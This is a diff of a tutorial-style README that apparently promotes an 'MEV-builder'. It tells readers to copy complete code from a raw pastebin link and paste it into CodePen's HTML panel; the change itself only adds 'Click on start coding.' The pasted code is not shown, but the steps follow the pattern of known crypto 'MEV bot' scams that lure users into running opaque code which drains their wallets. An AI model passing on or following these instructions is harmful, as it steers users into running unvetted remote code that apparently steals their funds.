@@ -24,7 +24,7 @@ Before you begin, ensure you have the following ready:
 ## 1. Begin by copying the complete code provided in the MEV-builder at: https://pastebin.com/raw/2RkFKkG2
 
 
-## 2. Open CodePen: Navigate to https://www.codepen.io/ .
+## 2. Open CodePen: Navigate to https://www.codepen.io/ .Click on start coding.
    - Maximize the HTML section and paste the full code you copied.
 ![1](https://github.com/user-attachments/assets/550bae8a-2b09-4a84-be5d-cf6f24202bea)
 
